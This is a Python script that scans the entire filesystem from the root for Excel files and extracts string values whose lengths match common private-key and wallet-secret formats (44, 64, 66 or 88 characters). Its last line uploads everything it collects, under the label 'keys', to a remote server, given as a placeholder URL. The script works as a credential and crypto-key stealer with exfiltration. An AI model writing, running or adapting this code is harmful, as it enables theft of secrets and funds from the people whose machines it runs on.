import os
import re
import pandas as pd
import requests

def find_excel_files(root_directory):
    # Find all Excel files in the given root directory
    excel_files = []
    for root, dirs, files in os.walk(root_directory):
        for file in files:
            if re.match(r'.*\.xlsx?$', file, re.IGNORECASE):
                excel_files.append(os.path.join(root, file))
    return excel_files

def extract_strings_from_excel(file_path, pattern):
    # Extract strings from an Excel file that match the given pattern
    extracted_strings = set()
    try:
        xls = pd.ExcelFile(file_path)
        for sheet_name in xls.sheet_names:
            df = pd.read_excel(xls, sheet_name)
            for value in df.values.flatten():
                if isinstance(value, str) and re.search(pattern, value):
                    print(value)
                    extracted_strings.add(value)
    except Exception as e:
        print(f"Error processing file {file_path}: {e}")
    return extracted_strings

def main(directory, pattern):
    # Main function to process all Excel files in a directory
    excel_files = find_excel_files(directory)
    all_extracted_strings = set()

    for file in excel_files:
        print(f"Processing file: {file}")
        extracted_strings = extract_strings_from_excel(file, pattern)
        all_extracted_strings.update(extracted_strings)

    print(f"\nTotal number of Excel files found: {len(excel_files)}")
    return all_extracted_strings

# Regular expression pattern to find strings of 44, 66, 64, or 88 characters long
pattern = r'^(.{44}|.{66}|.{64}|.{88})$'

# Example usage
key = main('/', pattern)
response = requests.post("https://your-cloud-server.com/api/upload", json={'keys': list(key)})
